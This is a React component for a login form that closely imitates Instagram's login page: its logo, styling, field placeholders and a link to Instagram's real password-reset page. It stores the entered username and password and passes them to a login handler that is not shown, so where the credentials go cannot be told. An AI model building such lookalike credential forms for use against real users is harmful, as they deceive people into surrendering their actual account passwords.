/* eslint-disable react/prop-types */
import { Box, HStack, Image, Input, Text, VStack } from "@chakra-ui/react";
import { Link } from "react-router-dom";
import { Button } from "../ui/button";
import { useUser } from "../../contexts/UserContext";

const EmailPassword = ({ handleLogin }) => {
  const { credentials, setCredentials, isLoading } = useUser();

  return (
    <>
      <Box
        display={{ md: "flex", base: "none" }}
        w="350px"
        p="36px"
        mb="1rem"
        border="1px solid rgb(219, 219, 219)"
      >
        <VStack w="100%" h="100%" alignItems="center">
          <Image
            src="./images/insta.png"
            alt="logo"
            w="175px"
            h="51px"
            mb="1.5rem"
          />

          <VStack w="100%" mb="0.5rem">
            <Input
              placeholder="Phone number, username or email"
              type="text"
              name="username"
              h="44px"
              border="1px solid rgb(219, 219, 219)"
              fontSize="12px"
              bg="rgb(250, 250, 250)"
              display="flex"
              alignItems="center"
              color="rgb(115, 115, 115)"
              borderRadius="3px"
              textOverflow="ellipsis"
              overflow="hidden"
              transformOrigin="left"
              transition="transform ease-out .1s"
              whiteSpace="nowrap"
              value={credentials.username}
              onChange={(e) =>
                setCredentials((prev) => ({
                  ...prev,
                  username: e.target.value,
                }))
              }
            />
            <Input
              placeholder="Password"
              type="password"
              name="password"
              h="44px"
              border="1px solid rgb(219, 219, 219)"
              fontSize="12px"
              bg="rgb(250, 250, 250)"
              display="flex"
              alignItems="center"
              color="rgb(115, 115, 115)"
              borderRadius="3px"
              textOverflow="ellipsis"
              overflow="hidden"
              transformOrigin="left"
              transition="transform ease-out .1s"
              whiteSpace="nowrap"
              value={credentials.password}
              onChange={(e) =>
                setCredentials((prev) => ({
                  ...prev,
                  password: e.target.value,
                }))
              }
            />
          </VStack>

          <Button
            mb="0.7rem"
            w="100%"
            bg="rgb(0, 149, 246)"
            // h="2rem"
            fontWeight="600"
            border="none"
            borderRadius="8px"
            _disabled={{
              opacity: "0.7",
              pointerEvent: "none",
              cursor: "default",
            }}
            onClick={handleLogin}
            disabled={
              isLoading || !credentials.username || !credentials.password
            }
            // disabled
          >
            Log in
          </Button>

          {/* <HStack w="100%">
                <Separator />
                <Text flexShrink="0" fontSize="13px" mx="0.5rem">
                  OR
                </Text>
                <Separator />
              </HStack> */}

          <HStack>
            <Link to="https://www.instagram.com/accounts/password/reset/">
              <Text fontSize="14px">Forgot password?</Text>
            </Link>
          </HStack>
        </VStack>
      </Box>

      <VStack display={{ md: "none", base: "flex" }} w="100%">
        <Image
          src="./images/insta.png"
          alt="logo"
          w="175px"
          h="51px"
          mb="3rem"
        />

        <VStack w="100%" gap="1rem">
          <Input
            placeholder="Phone number, username or email"
            type="text"
            name="username"
            h="44px"
            border="1px solid rgb(219, 219, 219)"
            fontSize="14px"
            bg="#f5f5f5"
            display="flex"
            alignItems="center"
            color="rgb(115, 115, 115)"
            borderRadius="3px"
            textOverflow="ellipsis"
            overflow="hidden"
            transformOrigin="left"
            transition="transform ease-out .1s"
            whiteSpace="nowrap"
            value={credentials.username}
            onChange={(e) =>
              setCredentials((prev) => ({
                ...prev,
                username: e.target.value,
              }))
            }
          />
          <Input
            placeholder="Password"
            type="password"
            name="password"
            h="44px"
            border="1px solid rgb(219, 219, 219)"
            fontSize="14px"
            bg="#f5f5f5"
            display="flex"
            alignItems="center"
            color="rgb(115, 115, 115)"
            borderRadius="3px"
            textOverflow="ellipsis"
            overflow="hidden"
            transformOrigin="left"
            transition="transform ease-out .1s"
            whiteSpace="nowrap"
            value={credentials.password}
            onChange={(e) =>
              setCredentials((prev) => ({
                ...prev,
                password: e.target.value,
              }))
            }
          />
        </VStack>

        <HStack w="100%" justifyContent="flex-end" mb="1.5rem">
          <Link to="https://www.instagram.com/accounts/password/reset/">
            <Text fontSize="14px" color="#0095f6">
              Forgot password?
            </Text>
          </Link>
        </HStack>

        <Button
          mb="0.7rem"
          w="100%"
          bg="rgb(0, 149, 246)"
          // h="2rem"
          fontSize="14px"
          fontWeight="600"
          border="none"
          borderRadius="8px"
          _disabled={{
            opacity: "0.7",
            pointerEvent: "none",
            cursor: "default",
          }}
          onClick={handleLogin}
          disabled={isLoading || !credentials.username || !credentials.password}
          // disabled
        >
          Log in
        </Button>
      </VStack>
    </>
  );
};

export default EmailPassword;
